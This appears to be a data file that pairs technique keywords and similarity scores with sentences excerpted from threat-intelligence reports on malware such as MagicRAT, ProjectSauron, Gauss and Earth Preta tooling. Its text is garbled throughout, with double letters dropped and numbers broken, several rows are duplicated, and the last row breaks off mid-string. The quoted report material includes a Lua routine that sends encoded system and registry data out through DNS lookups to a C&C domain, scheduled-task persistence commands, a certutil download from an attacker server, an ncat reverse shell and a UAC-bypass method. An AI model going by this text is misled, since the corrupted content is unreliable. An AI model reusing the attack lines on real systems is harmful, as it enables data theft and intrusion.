ZwMapViewOfSection; _QWORD qwordA8; _QWORD NtTerminateThread; _QWORD qwordB8; _QWORD qwordc0; _QWORD is_x64; _QWORD payload_size; _QWORD qword8; _BYTE payload[payload_size]; }; #pragma pack(pop) Herewith, in the analyzed sample the char0 value represents a asdsad123 constant.', 'The trojan alocates a memory block of the size of 0xD80F0 bytes to the previously launched svchost.exe proces and copies the entire region of 0xC80F0 bytes onto it.', 'Next, Trojan.XPath.3 searches for the 0x1234568 constant, which is located in the shelcode built into it and replaces it with the memory block adres, previously alocated in the svchost.exe proces.', 'It then copies this shelcode onto the alocated block using the 0xC90F0 ofset.']"
74d95823facffdc61cf1a73f5d1177a1,"Upload, download",0.7716087818835985,"['Although our analysis and atribution eforts are ongoing, we have discovered some indicators that sugest the threat actor may be a Chinese group.', 'The campaigns The APT group has launched at least four campaigns since late February, using a variety of lures, detailed below.', '1.', 'Interactive map of Ukraine The threat actor started this campaign around February 26, 202, and distributed its custom malware with the name interactive_map_UA.exe, trying to disguise it as an interactive map of Ukraine.', 'This campaign began a few days after Rusia invaded Ukraine, which shows the threat actor was monitoring the situation betwen Ukraine and Rusia and tok advantage of it to lure targets in Rusia.', '2.', 'Log4j patch In this campaign the threat actor packaged its custom malware in a tar file caled Patch_Log4j.tar.gz, a fake fix for Decembers high-profile Log4j vulnerability.', 'This campaign ran in early March and was primarily aimed at RT TV (formerly Rusia Today or Rosiya Segodnya, a Rusian state-controled international television network funded by the Rusian government).', 'The APT group had aces to almost 10 RT TV employes email adres.', 'The emails were sent with the subject .', '.']"
fd1e2466e0c27de5905c2d67061cd76f,"Upload, download",0.8697368176382959,"['Reflective and object file loader.', 'Decoding KRB5 ticket and converting it to hashcat.', 'Patching Event Tracing for Windows (ETW).', 'Patching Anti Malware Scan Interface (AMSI).', 'Create Windows system services.', 'Upload and download files.', 'Create files via CreateFileTransacted.', 'Port scan.', 'From Click to Brute Figure 4.', 'VirusTotal verdicts for sample as of June 27, 202.', 'The file in VirusTotal named Roshan_CV.iso (SHA256: 1FC7B0E1054D54CE8F1DE0C95976081C7A85C7926C03172A3DA67269042C) apears to be a curiculum 4/17 vitae (similar to a resume) of an individual named Roshan.']"
564c219dc0a2c3edd2eed08025387d9d,"Upload, download",0.889245176582951,"['comand codes in the MargualsRAT indicating that this RAT is actively in development by the atackers.', 'ALAKORE Alakore is a publicly available Delphi- based RAT that has consistently ben used in SideCopy operations along with CetaRAT.', 'Malicious capabilities of Alakore include: Keyloging.', 'Capture screnshots.', 'List folders and files.', 'Upload/Download files.', 'Steal clipboard data.', 'Grab/change walpaper.', 'In recent infections, this RAT is named Cyrus client (Figure 16).', 'ACTIONRAT ActionRAT is a Delphi-based RAT Figure 15: Comand handler of MargulasRAT.', 'containing a limited set of capabilities.']"
d3d11f0faf194266cc86ec9f1af4162d,record keystrokes,0.7547251246774769,"['Droper Extract, instal and potentialy launch or execute one or more malware files.', 'Credential Stealer Aces, copy or steal authentication credentials.', 'Point of Sale (POS) Obtain payment card information.', 'Ransomware Perform some malicious action (most often data encryption), with the goal of denying aces until a ransom is paid.', 'Other Includes keylogers, rotkits, botkits and utilities.', 'Keylogers record keystrokes.', 'Rotkits hide other malware.', 'Botkits are embeded dep in a systems bot proces.', 'Utilities are tols and suporting files that perform functions such as clearing log files.', 'SPECIAL REPORT M-TRENDS 2020 31 File Type The file format or file structure of malware may indicate the architecture or operating system the atacker was targeting.', 'Although most of the samples Figure 6. analyzed were Portable Executable (PE) files, we had four Linux families (Fig.']"
17b783a70edf2d901c8201d322f6289a,delete files.,0.7886834030746108,"['There is a unique feature that can also be found in other scripts packaged with the platform: during execution it performs DNS requests to semingly random subdomain names of the log C&C domain (bikesport.com), and each subdomain request is efectively a realtime status update that can be loged and analzyzed by the atackers.', 'The script was modified to remove sensitive information.', 'externalmail = ""74.125.148.1"" relayPort = ""43"" relayServer = ""217.160.176.157"" mailto = ""x.x.x@gmail.com"" mailSubject = ""Regarding your ofer"" mailBody = ""This is to inform you that I decline your ofer.', 'Se atachment.\\n Best Regards x"" domain = ""bikesport.com"" smtport = "" smtpserver = "" mail = function(l_1_0, l_1_1, l_1_2, l_1_3, l_1_4) bufer = "" id1 = string.uper(string.format(""%04x%04x"", math.random(4369, 6535), math.random(0, 6535) id2 = string.format(""%07u"", math.random(0, 9) boundary = string.format(""-%06u%06u%06u%06u"", math.random(0, 9), math.random(0, 9), math.random(0, 9), math.random(0, 9) delimiter = ""\\r\\n"" endOfRow = ""\\r\\n"" startBoundary = string.format(""-%s"", boundary) endBoundary = string.format(""%s%s-%s"", endOfRow, startBoundary, endOfRow) bufer = string.format(""%sMesage-ID: <%s.%s@localhost.localdomain>%s"", bufer, id1, id2, endOfRow) bufer = string.format(""%sFrom: <%s>%s"", bufer, l_1_1, endOfRow) bufer = string.format(""%sUser-Agent: Thunderbird 2.0.0.9 (Windows/2071031)%s"", bufer, endOfRow) bufer = string.format(""%sMIME-Version: 1.0%s"", bufer, endOfRow) bufer = string.format(""%sTo: %s%s"", bufer, l_1_0, endOfRow) bufer = string.format(""%sSubject: %s%s"", bufer, l_1_2, endOfRow) bufer = string.format(""%sContent-Type: multipart/mixed;%s boundary=\\""%s\\""%s"", bufer, endOfRow, boundary, endOfRow) bufer = string.format(""%s%s"", bufer, endOfRow) bufer = string.format(""%sThis is a multi-part mesage in MIME format.%s%s%s"", bufer, endOfRow, startBoundary, endOfRow) bufer = string.format(""%sContent-Type: text/plain; charset=ISO-859-1; format=flowed%s"", bufer, endOfRow) bufer = string.format(""%sContent-Transfer-Encoding: 7bit%s%s"", bufer, endOfRow, endOfRow) bufer = string.format(""%s%s%s"", bufer, l_1_3, endOfRow) bufer = string.format(""%s%s%s%s"", bufer, endOfRow, startBoundary, endOfRow) bufer = string.format(""%sContent-Type: aplication/x-msdownload;\\r\\n name=\\""data.bin\\""%s"", bufer, endOfRow) bufer = string.format(""%sContent-Transfer-Encoding: base64%s"", bufer, endOfRow) bufer = string.format(""%sContent-Disposition: atachment;\\r\\n filename=\\""data.bin\\""%s%s"", bufer, endOfRow, endOfRow) strLen = string.len(l_1_4) index = 1 repeat if index < strLen then istart = index index = index + 72 iend = index - 1 For any inquiries, contact intelreports@kaspersky.com Page 26 of 3 The ProjectSauron APT.', 'Technical analysis if strLen < iend then iend = strLen end bufer = string.format(""%s%s%s"", bufer, string.sub(l_1_4, istart, iend), endOfRow) else bufer = string.format(""%s%s"", bufer, endBoundary) return bufer end end end systemcheck = function() w.exec(""sinfo"") execStr = string.format(""sinfo | basex -b 32url | dext -l 30 a.""', '.', 'domain . ""', '| nslu -"") res = w.exec2str(execStr) w.exec(""netnfo -A"") execStr = string.format(""netnfo -irc | basex -b 32url | dext -l 30 c."" .', 'domain . ""', '| nslu -"") res = w.exec2str(execStr) w.exec2str(""su -t explorer.exe"") w.exec(""regedit -a \\""\\HKCU\\Software\\Microsoft\\Windows\\CurentVersion\\Internet Setings\\"") execStr = string.format(""regedit -a \\""\\HKCU\\Software\\Microsoft\\Windows\\CurentVersion\\Internet Setings\\"" | basex -b 32url | dext -l 30 d."" .', 'domain . ""']"
17b783a70edf2d901c8201d322f6289a,delete files.,0.7886834030746108,"['There is a unique feature that can also be found in other scripts packaged with the platform: during execution it performs DNS requests to semingly random subdomain names of the log C&C domain (bikesport.com), and each subdomain request is efectively a realtime status update that can be loged and analzyzed by the atackers.', 'The script was modified to remove sensitive information.', 'externalmail = ""74.125.148.1"" relayPort = ""43"" relayServer = ""217.160.176.157"" mailto = ""x.x.x@gmail.com"" mailSubject = ""Regarding your ofer"" mailBody = ""This is to inform you that I decline your ofer.', 'Se atachment.\\n Best Regards x"" domain = ""bikesport.com"" smtport = "" smtpserver = "" mail = function(l_1_0, l_1_1, l_1_2, l_1_3, l_1_4) bufer = "" id1 = string.uper(string.format(""%04x%04x"", math.random(4369, 6535), math.random(0, 6535) id2 = string.format(""%07u"", math.random(0, 9) boundary = string.format(""-%06u%06u%06u%06u"", math.random(0, 9), math.random(0, 9), math.random(0, 9), math.random(0, 9) delimiter = ""\\r\\n"" endOfRow = ""\\r\\n"" startBoundary = string.format(""-%s"", boundary) endBoundary = string.format(""%s%s-%s"", endOfRow, startBoundary, endOfRow) bufer = string.format(""%sMesage-ID: <%s.%s@localhost.localdomain>%s"", bufer, id1, id2, endOfRow) bufer = string.format(""%sFrom: <%s>%s"", bufer, l_1_1, endOfRow) bufer = string.format(""%sUser-Agent: Thunderbird 2.0.0.9 (Windows/2071031)%s"", bufer, endOfRow) bufer = string.format(""%sMIME-Version: 1.0%s"", bufer, endOfRow) bufer = string.format(""%sTo: %s%s"", bufer, l_1_0, endOfRow) bufer = string.format(""%sSubject: %s%s"", bufer, l_1_2, endOfRow) bufer = string.format(""%sContent-Type: multipart/mixed;%s boundary=\\""%s\\""%s"", bufer, endOfRow, boundary, endOfRow) bufer = string.format(""%s%s"", bufer, endOfRow) bufer = string.format(""%sThis is a multi-part mesage in MIME format.%s%s%s"", bufer, endOfRow, startBoundary, endOfRow) bufer = string.format(""%sContent-Type: text/plain; charset=ISO-859-1; format=flowed%s"", bufer, endOfRow) bufer = string.format(""%sContent-Transfer-Encoding: 7bit%s%s"", bufer, endOfRow, endOfRow) bufer = string.format(""%s%s%s"", bufer, l_1_3, endOfRow) bufer = string.format(""%s%s%s%s"", bufer, endOfRow, startBoundary, endOfRow) bufer = string.format(""%sContent-Type: aplication/x-msdownload;\\r\\n name=\\""data.bin\\""%s"", bufer, endOfRow) bufer = string.format(""%sContent-Transfer-Encoding: base64%s"", bufer, endOfRow) bufer = string.format(""%sContent-Disposition: atachment;\\r\\n filename=\\""data.bin\\""%s%s"", bufer, endOfRow, endOfRow) strLen = string.len(l_1_4) index = 1 repeat if index < strLen then istart = index index = index + 72 iend = index - 1 For any inquiries, contact intelreports@kaspersky.com Page 26 of 3 The ProjectSauron APT.', 'Technical analysis if strLen < iend then iend = strLen end bufer = string.format(""%s%s%s"", bufer, string.sub(l_1_4, istart, iend), endOfRow) else bufer = string.format(""%s%s"", bufer, endBoundary) return bufer end end end systemcheck = function() w.exec(""sinfo"") execStr = string.format(""sinfo | basex -b 32url | dext -l 30 a.""', '.', 'domain . ""', '| nslu -"") res = w.exec2str(execStr) w.exec(""netnfo -A"") execStr = string.format(""netnfo -irc | basex -b 32url | dext -l 30 c."" .', 'domain . ""', '| nslu -"") res = w.exec2str(execStr) w.exec2str(""su -t explorer.exe"") w.exec(""regedit -a \\""\\HKCU\\Software\\Microsoft\\Windows\\CurentVersion\\Internet Setings\\"") execStr = string.format(""regedit -a \\""\\HKCU\\Software\\Microsoft\\Windows\\CurentVersion\\Internet Setings\\"" | basex -b 32url | dext -l 30 d."" .', 'domain . ""']"
08a0ccc49008dbbf532b22d39ac2b886,delete files.,1.0,"['Upon execution, MagicRAT achieves persistence for itself by executing a hardcoded comand that creates scheduled tasks on the victim machine.', 'Comand Intent schtasks /create /tn ""OneDrive AutoRemove"" /tr Scheduled task starting at ""C:\\Windows\\System32\\cmd.exe /c del /f /q a specific time C:/TEMP/[MagicRAT_file_name].exe"" /sc daily /st 10:30:30 /ru [T1053/05] SYSTEM Scheduled task starting at schtasks /create /tn ""Microsoft\\Windows\\light Service Manager"" /tr a diferent time an path C:/TEMP/[MagicRAT_file_name].exe /sc onstart /ru SYSTEM [T1053/05] %HOME%/ApData/Roaming/Microsoft/Windows/Start Link created on startup Menu/Programs/Startup/OneNote.lnk folder [T1547/01] Upon achieving persistence, the RAT contacts the C2.', '4/12 During the initial stages of execution, MagicRAT wil perform just enough system reconaisance to identify the system and environment in which the atackers are operating.', 'This is done by executing the comands whoami, systeminfo and ipconfig /al.', 'The last comand has its results returned via the upload of the file zero_dump.mix to the C2.', ""MagicRAT is rather simple it provides the operator with a remote shel on the victim's system for arbitrary comand execution, along with the ability to rename, move and delete files on the endpoint."", 'The operator can determine the timing for the implant to slep, change the C2 URLs and delete the implant from the infected system.', 'We also discovered a new variant of MagicRAT in the wild generated in April 202.', 'This sample now consisted of the ability to delete itself from the infected endpoint using a BAT file.', 'Aditional malware One of the C2 servers used by the new MagicRAT sample, 64[.]18[.]27[.', ']73, hosted two more distinct implants masquerading as GIF URLs.']"
d5019121cbc645eb0787efab173a12b3,TeamViewer,1.0,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
2f9cb1419d88d162b0fe29430bf53db3,"Payload
Obfuscation",0.8062104865847488,"['ESET Research White papers / July 2019 MACHETE JUST GOT SHARPER Venezuelan military under atack How spies managed to steal gigabytes of confidential data over the course of a year TABLE OF CONTENTS 1.', 'Introduction .', '.', '.', '.', '.', '.', '.']"
2f9cb1419d88d162b0fe29430bf53db3,"Payload
Obfuscation",0.8062104865847488,"['ESET Research White papers / July 2019 MACHETE JUST GOT SHARPER Venezuelan military under atack How spies managed to steal gigabytes of confidential data over the course of a year TABLE OF CONTENTS 1.', 'Introduction .', '.', '.', '.', '.', '.', '.']"
2f9cb1419d88d162b0fe29430bf53db3,"Payload
Obfuscation",0.8062104865847488,"['ESET Research White papers / July 2019 MACHETE JUST GOT SHARPER Venezuelan military under atack How spies managed to steal gigabytes of confidential data over the course of a year TABLE OF CONTENTS 1.', 'Introduction .', '.', '.', '.', '.', '.', '.']"
cae33c8970a53857dff6608fe8894b8a,Scheduled Task Creation or,0.7658292362268457,"['Copyright Leonardo S.p.a. Al rights reserved 2 Company General Use MALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 6.', 'MITRE AT&CK TPs T1059 Comand-Line Comand-line interfaces provide a way of interacting with computer Interface systems and is a comon feature acros many types of operating system platforms.', 'One example comand-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software.', 'Comand-line interfaces can be interacted with localy or remotely via a remote desktop aplication, reverse shel sesion, etc.', 'Comands that are executed run with the curent permision level of the comand-line interface proces unles the comand includes proces invocation that changes permisions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a wel-established method used by both defenders and adversaries to hide open ports from aces.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port wil be opened.', 'Usualy this series of packets consists of atempted conections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.', 'After the sequence is completed, opening a port is often acomplished by the host based firewal, but could also be implemented by custom software.', 'T105 Remote File Files may be copied from one system to another to stage adversary Copy tols or other files over the course of an operation.']"
41d6e1e379006c93e59f114b3161977e,the payload decryption key,0.8424837856443437,"['Payload .VBS file Analysis The folowing screnshot shows a part of the .VBS payload file droped by .RTF file.', 'First line is the encrypted .dl 4th line contains Key to decrypt the .dl.', 'Remaining part is self-explanatory.', 'The instruction c = Crypt(c,k) function decrypts the encrypted dl and returns the decrypted dl.', '(Se the screnshot above) c= encrypted dl.', 'k = decryption key.', 'Folowing function writes byte by byte to the droped.dl file.', 'Finaly, the folowing code executes the regsvr32 comand to run the wmiprvse.dl in silent mode and sets the run key in registry.', 'Payload wmiprvse.dl file Analysis This first level of deobfuscation in wmiprvse.dl takes around 3-4 minutes to finish.', 'Then it alocates memory using VirtualAloc and writes the unpacked code to newly alocated memory before it jumps to the unpacked code as shown in folowing scren shot.', 'This dl has 3 layers of unpacking.']"
41d6e1e379006c93e59f114b3161977e,the payload decryption key,0.8424837856443437,"['Payload .VBS file Analysis The folowing screnshot shows a part of the .VBS payload file droped by .RTF file.', 'First line is the encrypted .dl 4th line contains Key to decrypt the .dl.', 'Remaining part is self-explanatory.', 'The instruction c = Crypt(c,k) function decrypts the encrypted dl and returns the decrypted dl.', '(Se the screnshot above) c= encrypted dl.', 'k = decryption key.', 'Folowing function writes byte by byte to the droped.dl file.', 'Finaly, the folowing code executes the regsvr32 comand to run the wmiprvse.dl in silent mode and sets the run key in registry.', 'Payload wmiprvse.dl file Analysis This first level of deobfuscation in wmiprvse.dl takes around 3-4 minutes to finish.', 'Then it alocates memory using VirtualAloc and writes the unpacked code to newly alocated memory before it jumps to the unpacked code as shown in folowing scren shot.', 'This dl has 3 layers of unpacking.']"
d62a6e941ec0167b0f3e15c72eb634ba,an encrypted configuration.,0.8278379401626659,"['It writes itself in files: and modifies the %system32%\\wbem\\wmiqry32.dl, %system32%\\wbem\\wmihlp32.dl system registry to be loaded instead of file.', '%system32%\\wbem\\wbemsvc.dl To achieve this, it writes the folowing registry value: [HKCR\\CLSID\\{7C857801-7381-1CF-84D-0A04B2E24}\\InProcServer32] Default = %system32%\\wbem\\wmihlp32.dl Operation The module is automaticaly loaded into proceses that use wbemsvc.dl.', 'When loaded in svchost.exe that was started with -k netsvc parameter, it starts its main thread.', 'The module creates ShelHWStop, Global\\ShelHWDetectionEvent events, mutex ShelHWDetectionMutex.', '12 The main thread exits if the folowing proceses were found at its start: LMon.exe sagui.exe RDTask.exe kpf4gui.exe ALsvc.exe pxagent.exe fsma32.exe licwiz.exe SavService.exe prevxcsi.exe alertwal.exe livehelp.exe SAVAdminService.exe csi-eui.exe mpf.exe lokout.exe savprogres.exe lpfw.exe mpfcm.exe emlproui.exe savmain.exe outpost.exe fameh32.exe emlproxy.exe savcleanup.exe filemon.exe AntiHok.exe endtaskpro.exe savcli.exe procmon.exe xfilter.exe netguardlite.exe backgroundscanclient.exe Snifer.exe scfservice.exe oasclnt.exe sdcservice.exe acs.exe scfmanager.exe omnitray.exe sdcdevconx.exe aupdrun.exe spywareterminatorshield.exe onlinent.exe sdcdevconIA.exe spfw.exe spywat~1.exe opf.exe sdcdevcon.exe spfirewalsvc.exe supdate.exe pctavsvc.exe configuresav.exe fwsrv.exe terminet.exe pctav.exe alupdate.exe opfsvc.exe tscutynt.exe pcviper.exe InstLsp.exe uwcdsvr.exe umxtray.exe persfw.exe CMain.exe dfw.exe updclient.exe pgacount.exe CavAUD.exe ipatrol.exe webwal.exe privatefirewal3.exe CavEmSrv.exe pciprev.exe winroute.exe protect.exe Cavmr.exe prifw.exe apvxdwin.exe rt_crc_service.exe Cavl.exe tzpfw.exe as3pf.exe schedulerdaemon.exe CavAp.exe privatefirewal3.exe avas.exe sdtrayap.exe CavCons.exe pft.exe avcom.exe siteadv.exe CavMud.exe armorwal.exe avkproxy.exe sndsrvc.exe CavUMAS.exe ap_firewal.exe avkservice.exe snsmcon.exe Upd.exe blackd.exe avktray.exe snsupd.exe cavasm.exe blackice.exe avkwctrl.exe procguard.exe CavSub.exe umxagent.exe avmgma.exe DCSUserProt.exe CavUserUpd.exe kpf4s.exe avtask.exe avkwctl.exe CavQ.exe tpfdmn.exe aws.exe firewal.exe Cavoar.exe blinksvc.exe bgctl.exe THGuard.exe CEmRep.exe sp_rser.exe bgnt.exe spybotsd.exe OnAcesInstaler.exe op_mon.exe botsafe.exe xauth_service.exe SoftAct.exe cmdagent.exe bulguard.exe xfilter.exe CavSn.exe VCATCH.EXE cdas2.exe zlh.exe Packetizer.exe SpyHunter3.exe cmgrdian.exe adoronsfirewal.exe Packetyzer.exe washer.exe configmgr.exe scfservice.exe zanda.exe authfw.exe cpd.exe scfmanager.exe zerospywarele.exe dvpapi.exe espwatch.exe dltray.exe 13 zerospywarelite_instaler.exe clamd.exe fgui.exe dlservice.exe Wireshark.exe sab_wab.exe filedeleter.exe ashwebsv.exe tshark.exe SUPERAntiSpyware.exe firewal.exe ashdisp.exe rawshark.exe vdtask.exe firewal204.exe ashmaisv.exe Ethereal.exe asr.exe firewalgui.exe ashserv.exe Tethereal.exe NetguardLite.exe gateway.exe aswupdsv.exe Windump.exe nstzerospywarelite.exe hpf_.exe avastui.exe Tcpdump.exe cdinstx.exe iface.exe avastsvc.exe Netcap.exe cdas17.exe invent.exe Netmon.exe fsrt.exe ipcserver.exe CV.exe VSDesktop.exe ipctray.exe The module reads the registry value SOFTWARE\\Microsoft\\Windows\\CurentVersion\\Reliability TimeStampForUI.', 'It is an encrypted configuration file.', 'The configuration file contains the list of aditional modules, their names, DL exports names to cal and location of the modules aditional files.', 'Gaus ShelNotifyUser ShelNotifyUserEx SetWindowEvent InitShelEx %systemrot%\\system32\\winshel.ocx %temp%\\ws1bin.dat Godel InitCache RevertCache ValidateEntry CreateEntry %windir%\\system32\\dskapi.ocx %temp%\\~gdl.tmp UsbDir InitCache RevertCache ValidateEntry CreateEntry %windir%\\system32\\smdk.ocx %temp%\\~mdk.tmp String values from config file (example) 14 Every module is loaded and its export functions are caled as specified in the configuration.', 'Most of the actions are loged in an encrypted (with XOR) file %temp%\\~shw.tmp.', 'Sample of decrypted ~shw.tmp After loading aditional modules, it tries to acquire the same privileges as explorer.exe and then starts its C&C interaction lop.', 'Prior to comunicating with the C&C, al the information from the other modules log files is copied to the ~shw.tmp file.']"
fcef139433bae54ea996aa09f7e1fcf4,The decryption function,0.8354975659888249,"['The executables were sen with the filenames ""Update.exe"", ""ntfsc.exe"" or ""nx"" in this campaign.', 'They are either downloaded or droped into the victim\'s ""local aplication data"" folder and run as a Windows Security update with medium integrity to elevate the privileges of a standard user.', 'The actor uses comon encoding techniques to obfuscate strings in the WinMain function to hide its behavior from static analysis tols.', 'WinMain function snipet.', 'The decryption function receives the encrypted strings and decrypts each character with the XOR operation and stores the result in an aray that wil be returned to the caler function.', '1/19 Decryption function.', ""The malware searches for the Windows Defender and Kaspersky antivirus proceses in the victim's machine by creating the snapshot of runing proceses using CreateTolhelp32Snapshot and iterates through each proces using API Proces32First and Proces32Next."", 'WinMain() snipet showing antivirus proces detection.', ""12/19 The information-gathering function gathers the victim's hostname, operating system product name, and the victim's username and writes them into a memory bufer."", 'Information-gathering function.', 'The C2 comunicating function at ofset 401C50 is caled from the two other requests making functions to send the victim\'s information with the decrypted strings ""xnb/dxagt5avb2.php?txt="" and ""data1.php?']"
7d92f97b145ba4828809a1d8754bdfde,the group used certutil.exe to download the legitimate WinRAR binary as rar1.exe from the server,0.8246594116554675,"['If it is instaled, it wil start to infect more removable disks and copy files to a folder named autorun.inf.', 'If it is not instaled, it instals itself to %programdata% and then sets the registry run key for persistence.', 'Finaly, the ACNSHEL malware rzlog4cp.dl is sideloaded.', 'It wil then create a reverse shel via ncat.exe to the server closed[.]theworkpc[.]com.', 'Comand and Control (C&C) stage Earth Preta employed several tols and comands for the C&C stage.', 'For example, the group used certutil.exe to download the legitimate WinRAR binary as rar1.exe from the server 103[.]159[.]132[.]91.', 'Figure 19.', 'The certutil.exe program downloads the WinRAR binary We also observed that the threat actors used PowerShel to download multiple malware and archives from the server 103[.]159[.]132[.', ']181 for future use.', 'Figure 20.', 'PowerShel downloading malware In certain instances, they even leveraged the WinRAR binary instaled on the victim hosts to decompres al the malware.']"
7d92f97b145ba4828809a1d8754bdfde,This service has the highest privileges that can be abused for Windows 10 UAC bypass.,0.8236898946924702,"['To hide this window, the tol explicitly ads new entries to HKCU\\Software\\Microsoft\\Windows\\CurentVersion\\AplicationAsociationToasts to disable al toasts related to the protocol ms-windows-store.', '10/42 Figure 15.', 'An example of the aplication asociation toast Figure 16.', 'Hiding aplication asociation toasts via the registry Once this is done, the tol starts to alter the shel comand of ms-windows-store and finaly trigers it using WSReset.exe.', 'SilentCleanup In Windows 10, there is a native Windows service caled SilentCleanup.', 'This service has the highest privileges that can be abused for Windows 10 UAC bypas.', 'Normaly, this service is intended for runing %windir%\\system32\\cleanmgr.exe.', 'However, the environment variable %windir% can be hijacked and changed to any path to achieve privilege escalation.', '1/42 Figure 17.', 'Malicious comands abusing the SilentCleanup service We observed that the threat actors used this technique to execute c:\\users\\public\\1.exe.', 'Lateral movement In this stage, we observed certain malware such as HIUPAN and ACNSHEL (initialy introduced and analyzed by Mandiant and Sophos) being used to instal themselves to removable disks and create a reverse shel.']"
17b783a70edf2d901c8201d322f6289a,Delete file,0.8186797188656947,"['There is a unique feature that can also be found in other scripts packaged with the platform: during execution it performs DNS requests to semingly random subdomain names of the log C&C domain (bikesport.com), and each subdomain request is efectively a realtime status update that can be loged and analzyzed by the atackers.', 'The script was modified to remove sensitive information.', 'externalmail = ""74.125.148.1"" relayPort = ""43"" relayServer = ""217.160.176.157"" mailto = ""x.x.x@gmail.com"" mailSubject = ""Regarding your ofer"" mailBody = ""This is to inform you that I decline your ofer.', 'Se atachment.\\n Best Regards x"" domain = ""bikesport.com"" smtport = "" smtpserver = "" mail = function(l_1_0, l_1_1, l_1_2, l_1_3, l_1_4) bufer = "" id1 = string.uper(string.format(""%04x%04x"", math.random(4369, 6535), math.random(0, 6535) id2 = string.format(""%07u"", math.random(0, 9) boundary = string.format(""-%06u%06u%06u%06u"", math.random(0, 9), math.random(0, 9), math.random(0, 9), math.random(0, 9) delimiter = ""\\r\\n"" endOfRow = ""\\r\\n"" startBoundary = string.format(""-%s"", boundary) endBoundary = string.format(""%s%s-%s"", endOfRow, startBoundary, endOfRow) bufer = string.format(""%sMesage-ID: <%s.%s@localhost.localdomain>%s"", bufer, id1, id2, endOfRow) bufer = string.format(""%sFrom: <%s>%s"", bufer, l_1_1, endOfRow) bufer = string.format(""%sUser-Agent: Thunderbird 2.0.0.9 (Windows/2071031)%s"", bufer, endOfRow) bufer = string.format(""%sMIME-Version: 1.0%s"", bufer, endOfRow) bufer = string.format(""%sTo: %s%s"", bufer, l_1_0, endOfRow) bufer = string.format(""%sSubject: %s%s"", bufer, l_1_2, endOfRow) bufer = string.format(""%sContent-Type: multipart/mixed;%s boundary=\\""%s\\""%s"", bufer, endOfRow, boundary, endOfRow) bufer = string.format(""%s%s"", bufer, endOfRow) bufer = string.format(""%sThis is a multi-part mesage in MIME format.%s%s%s"", bufer, endOfRow, startBoundary, endOfRow) bufer = string.format(""%sContent-Type: text/plain; charset=ISO-859-1; format=flowed%s"", bufer, endOfRow) bufer = string.format(""%sContent-Transfer-Encoding: 7bit%s%s"", bufer, endOfRow, endOfRow) bufer = string.format(""%s%s%s"", bufer, l_1_3, endOfRow) bufer = string.format(""%s%s%s%s"", bufer, endOfRow, startBoundary, endOfRow) bufer = string.format(""%sContent-Type: aplication/x-msdownload;\\r\\n name=\\""data.bin\\""%s"", bufer, endOfRow) bufer = string.format(""%sContent-Transfer-Encoding: base64%s"", bufer, endOfRow) bufer = string.format(""%sContent-Disposition: atachment;\\r\\n filename=\\""data.bin\\""%s%s"", bufer, endOfRow, endOfRow) strLen = string.len(l_1_4) index = 1 repeat if index < strLen then istart = index index = index + 72 iend = index - 1 For any inquiries, contact intelreports@kaspersky.com Page 26 of 3 The ProjectSauron APT.', 'Technical analysis if strLen < iend then iend = strLen end bufer = string.format(""%s%s%s"", bufer, string.sub(l_1_4, istart, iend), endOfRow) else bufer = string.format(""%s%s"", bufer, endBoundary) return bufer end end end systemcheck = function() w.exec(""sinfo"") execStr = string.format(""sinfo | basex -b 32url | dext -l 30 a.""', '.', 'domain . ""', '| nslu -"") res = w.exec2str(execStr) w.exec(""netnfo -A"") execStr = string.format(""netnfo -irc | basex -b 32url | dext -l 30 c."" .', 'domain . ""', '| nslu -"") res = w.exec2str(execStr) w.exec2str(""su -t explorer.exe"") w.exec(""regedit -a \\""\\HKCU\\Software\\Microsoft\\Windows\\CurentVersion\\Internet Setings\\"") execStr = string.format(""regedit -a \\""\\HKCU\\Software\\Microsoft\\Windows\\CurentVersion\\Internet Setings\\"" | basex -b 32url | dext -l 30 d."" .', 'domain . ""']"
17b783a70edf2d901c8201d322f6289a,Delete file,0.8186797188656947,"['There is a unique feature that can also be found in other scripts packaged with the platform: during execution it performs DNS requests to semingly random subdomain names of the log C&C domain (bikesport.com), and each subdomain request is efectively a realtime status update that can be loged and analzyzed by the atackers.', 'The script was modified to remove sensitive information.', 'externalmail = ""74.125.148.1"" relayPort = ""43"" relayServer = ""217.160.176.157"" mailto = ""x.x.x@gmail.com"" mailSubject = ""Regarding your ofer"" mailBody = ""This is to inform you that I decline your ofer.', 'Se atachment.\\n Best Regards x"" domain = ""bikesport.com"" smtport = "" smtpserver = "" mail = function(l_1_0, l_1_1, l_1_2, l_1_3, l_1_4) bufer = "" id1 = string.uper(string.format(""%04x%04x"", math.random(4369, 6535), math.random(0, 6535) id2 = string.format(""%07u"", math.random(0, 9) boundary = string.format(""-%06u%06u%06u%06u"", math.random(0, 9), math.random(0, 9), math.random(0, 9), math.random(0, 9) delimiter = ""\\r\\n"" endOfRow = ""\\r\\n"" startBoundary = string.format(""-%s"", boundary) endBoundary = string.format(""%s%s-%s"", endOfRow, startBoundary, endOfRow) bufer = string.format(""%sMesage-ID: <%s.%s@localhost.localdomain>%s"", bufer, id1, id2, endOfRow) bufer = string.format(""%sFrom: <%s>%s"", bufer, l_1_1, endOfRow) bufer = string.format(""%sUser-Agent: Thunderbird 2.0.0.9 (Windows/2071031)%s"", bufer, endOfRow) bufer = string.format(""%sMIME-Version: 1.0%s"", bufer, endOfRow) bufer = string.format(""%sTo: %s%s"", bufer, l_1_0, endOfRow) bufer = string.format(""%sSubject: %s%s"", bufer, l_1_2, endOfRow) bufer = string.format(""%sContent-Type: multipart/mixed;%s boundary=\\""%s\\""%s"", bufer, endOfRow, boundary, endOfRow) bufer = string.format(""%s%s"", bufer, endOfRow) bufer = string.format(""%sThis is a multi-part mesage in MIME format.%s%s%s"", bufer, endOfRow, startBoundary, endOfRow) bufer = string.format(""%sContent-Type: text/plain; charset=ISO-859-1; format=flowed%s"", bufer, endOfRow) bufer = string.format(""%sContent-Transfer-Encoding: 7bit%s%s"", bufer, endOfRow, endOfRow) bufer = string.format(""%s%s%s"", bufer, l_1_3, 